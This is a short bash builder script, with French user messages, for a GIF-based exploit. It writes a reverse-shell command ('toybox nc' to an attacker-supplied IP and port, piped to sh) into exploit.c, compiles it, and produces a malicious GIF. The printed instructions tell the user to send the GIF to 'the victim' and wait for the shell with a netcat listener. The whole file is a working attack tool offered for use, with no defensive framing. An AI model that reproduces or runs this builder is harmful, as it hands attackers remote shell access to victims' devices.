#!/bin/bash

if [ $# -ne 3 ]; then
    echo "Usage: $0 [adresse_ip] [port] [nom_gif]"
    exit 1
fi

ip_address="$1"
port="$2"
gif_name="$3"

green="\e[32m"
reset="\e[0m"


sed -i "s/\/exp > dfg.gif/\/exp > $gif_name.gif/" $0

sed -i "75s/.*/    char *command = \"toybox nc $ip_address $port | sh\";/" exploit.c

gcc -o exp egif_lib.c exploit.c

./exp > "$gif_name.gif"

echo -e "${green}Pour recevoir la connexion sur le serveur, veuillez envoyer $gif_name.gif à la victime en ayant pris soin d'ouvrir un terminal sur le serveur et d'exécuter la commande suivante :${reset}"
echo -e "${green}nc -lvnp $port${reset}"
mv "$gif_name.gif" "./public/$gif_name.gif"
rm -rf exp